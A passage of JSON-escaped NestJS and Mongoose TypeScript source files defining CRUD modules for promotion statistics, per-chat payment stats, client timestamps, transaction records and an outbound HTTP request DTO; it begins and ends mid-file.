updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { initModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [initModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","import { IsOptional, IsEnum, IsObject, IsUrl, IsNumber, Min, Max } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Method } from 'axios';\r\nimport { Transform } from 'class-transformer';\r\n\r\nenum ResponseType {\r\n    JSON = 'json',\r\n    TEXT = 'text',\r\n    STREAM = 'stream',\r\n    BLOB = 'blob',\r\n    DOCUMENT = 'document',\r\n    ARRAYBUFFER = 'arraybuffer'\r\n}\r\n\r\nexport class ExecuteRequestDto {\r\n    @ApiProperty({ description: 'The URL to send the request to' })\r\n    @IsUrl({}, { message: 'Please provide a valid URL' })\r\n    url: string;\r\n\r\n    @ApiPropertyOptional({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' })\r\n    @IsEnum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'] as const)\r\n    @IsOptional()\r\n    method?: Method;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: \"string\" } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    headers?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ description: 'Request body data' })\r\n    @IsOptional()\r\n    data?: any;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: 'string' } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    params?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ enum: ResponseType, default: ResponseType.JSON })\r\n    @IsEnum(ResponseType)\r\n    @IsOptional()\r\n    responseType?: ResponseType;\r\n\r\n    @ApiPropertyOptional({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 })\r\n    @IsNumber()\r\n    @Min(1000)\r\n    @Max(300000)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    timeout?: number;\r\n\r\n    @ApiPropertyOptional({ description: 'Whether to follow redirects', default: true })\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === 'true' || value === true)\r\n    followRedirects?: boolean;\r\n\r\n    @ApiPropertyOptional({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 })\r\n    @IsNumber()\r\n    @Min(0)\r\n    @Max(10)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    maxRedirects?: number;\r\n}","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","import { Controller, Get, Body, Patch, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiQuery } from '@nestjs/swagger';\nimport { TimestampService } from './timestamp.service';\n\n@ApiTags('Timestamps')\n@Controller('timestamps')\nexport class TimestampController {\n  constructor(private readonly timestampService: TimestampService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get timestamp data' })\n  async findOne(): Promise<any> {\n    return this.timestampService.findOne();\n  }\n\n  @Get('stalled')\n  @ApiOperation({ summary: 'Get clients with time differences greater than threshold' })\n  @ApiQuery({ \n    name: 'threshold', \n    type: Number, \n    required: false, \n    description: 'Minimum time difference in minutes (default: 3)' \n  })\n  async getClientsWithTimeDifference(@Query('threshold') thresholdMinutes?: number): Promise<any[]> {\n    // Convert minutes to milliseconds, default to 3 minutes if not provided\n    const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;\n    return this.timestampService.getClientsWithTimeDifference(threshold);\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update timestamp data' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateTimestampDto: any): Promise<any> {\n    return this.timestampService.update(updateTimestampDto);\n  }\n}","import { Module, Global, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TimestampService } from './timestamp.service';\nimport { TimestampController } from './timestamp.controller';\nimport { TimestampSchema } from './timestamps.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Global()\n@Module({\n  imports: [\n    MongooseModule.forFeature([{ \n      name: 'timestampModule', \n      collection: 'timestamps', \n      schema: TimestampSchema \n    }]),\n    forwardRef(() => ClientModule),\n  ],\n  providers: [TimestampService],\n  controllers: [TimestampController],\n  exports: [TimestampService],\n})\nexport class TimestampModule {}","import { Injectable, NotFoundException, Inject, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Timestamp } from './timestamps.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class TimestampService {\n    constructor(\n        @InjectModel('timestampModule') private timestampModel: Model<Timestamp>,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async findOne(): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (timestamp._id) {\n            delete timestamp._id;\n        }\n\n        return timestamp;\n    }\n\n    async getTimeDifferences(threshold: number = 3 * 60 * 1000): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        const currentTime = Date.now();\n        const differences = {};\n\n        // Loop through each timestamp entry\n        Object.keys(timestamp).forEach(key => {\n            // Skip the _id field and non-numeric values\n            if (key === '_id' || typeof timestamp[key] !== 'number') {\n                return;\n            }\n\n            const difference = currentTime - timestamp[key];\n\n            // Only include differences that are greater than the threshold\n            if (difference > threshold) {\n                differences[key] = difference;\n            }\n        });\n\n        return differences;\n    }\n\n    async getClientsWithTimeDifference(threshold: number = 3 * 60 * 1000): Promise<any[]> {\n        const differences = await this.getTimeDifferences(threshold);\n        const clientIds = Object.keys(differences);\n\n        if (clientIds.length === 0) {\n            return [];\n        }\n\n        const urls = [];\n        for (const clientId of clientIds) {\n            const clientParams = clientId.split('_');\n            try {\n                const client = await this.clientService.findOne(clientParams[0], false);\n                if (client) {\n                    if (clientParams[1]) {\n                        urls.push(client.promoteRepl);\n                    } else {\n                        urls.push(client.repl);\n                    }\n                }\n            } catch (error) {\n                console.error(`Error fetching client with ID ${clientId}:`, error.message);\n            }\n        }\n\n        return urls;\n    }\n\n    async update(updateTimestampDto: any): Promise<any> {\n        // Ensure _id is removed from the input\n        delete updateTimestampDto['_id'];\n\n        const updatedTimestamp = await this.timestampModel.findOneAndUpdate(\n            {}, // Update the first document found in the collection\n            { $set: { ...updateTimestampDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedTimestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (updatedTimestamp._id) {\n            delete updatedTimestamp._id;\n        }\n\n        return updatedTimestamp;\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type TimestampDocument = Timestamp & Document;\n\n@Schema({\n  versionKey: false, \n  autoIndex: true, \n  strict: false,  \n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Timestamp {}\n\nexport const TimestampSchema = SchemaFactory.createForClass(Timestamp);\nTimestampSchema.add({ type: mongoose.Schema.Types.Mixed });","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsOptional, IsEnum, MinLength, Min, IsNotEmpty } from 'class-validator';\nimport { Transform } from 'class-transformer';\n\nexport enum TransactionStatus {\n  PENDING = 'pending',\n  COMPLETED = 'completed',\n  FAILED = 'failed',\n  CANCELLED = 'cancelled'\n}\n\nexport class CreateTransactionDto {\n  @ApiProperty({ \n    description: 'Unique transaction ID (UTR)',\n    example: 'TXN123456789',\n    minLength: 8 \n  })\n  @IsString()\n  @IsNotEmpty()\n  @MinLength(8)\n  @Transform(({ value }) => typeof value === 'string' ? value.toLowerCase() : value)\n  transactionId: string;\n\n  @ApiProperty({ \n    description: 'Amount involved in the transaction',\n    example: 100.50,\n    minimum: 0 \n  })\n  @IsNumber()\n  @Min(0)\n  @Transform(({ value }) => parseFloat(value))\n  amount: number;\n\n  @ApiProperty({ \n    description: 'Issue type reported by the user',\n    example: 'payment_failed'\n  })\n  @IsString()\n  @IsNotEmpty()\n  issue: string;\n\n  @ApiProperty({ \n    description: 'Description of issue reported by the user',\n    example: 'Payment failed due to network error'\n  })\n  @IsString()\n  @IsNotEmpty()\n  description: string;\n\n  @ApiPropertyOptional({\n    description: 'Refund method selected by the user',\n    example: 'bank_transfer',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  refundMethod?: string;\n\n  @ApiPropertyOptional({ \n    description: 'User profile ID',\n    example: 'user123',\n    required: false \n  })\n  @IsString()\n  @IsOptional()\n  profile: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'User chat ID',\n    example: 'chat123',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  chatId: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'IP address of the user',\n    example: '192.168.1.1',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  ip: string = \"undefined\";\n\n  @ApiPropertyOptional({ \n    description: 'Transaction status',\n    enum: TransactionStatus,\n    default: TransactionStatus.PENDING,\n    required: false\n  })\n  @IsEnum(TransactionStatus)\n  @IsOptional()\n  status: TransactionStatus = TransactionStatus.PENDING;\n}\n","import { PartialType } from '@nestjs/swagger';\nimport { CreateTransactionDto } from './create-transaction.dto';\n\nexport class UpdateTransactionDto extends PartialType(CreateTransactionDto) {}","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { Document, Schema as MongooseSchema } from 'mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { TransactionStatus } from '../dto/create-transaction.dto';\n\nexport type TransactionDocument = Transaction & Document;\n\n@Schema({\n  collection: 'transactions',\n  versionKey: false,\n  autoIndex: true,\n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      ret.id = ret._id;\n      delete ret._id;\n      return ret;\n    },\n  }\n})\nexport class Transaction {\n  @ApiProperty({ description: 'Unique transaction ID (UTR)' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    required: true, \n    unique: true,\n    index: true \n  })\n  transactionId: string;\n\n  @ApiProperty({ description: 'Amount involved in the transaction' })\n  @Prop({ \n    type: MongooseSchema.Types.Number, \n    required: true,\n    min: 0 \n  })\n  amount: number;\n\n  @ApiProperty({ description: 'Issue type reported by the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    required: true,\n    index: true\n  })\n  issue: string;\n\n  @ApiProperty({ description: 'Description of issue reported by the user' })\n  @Prop({ \n    type: MongooseSchema.Types.String, \n    required: true 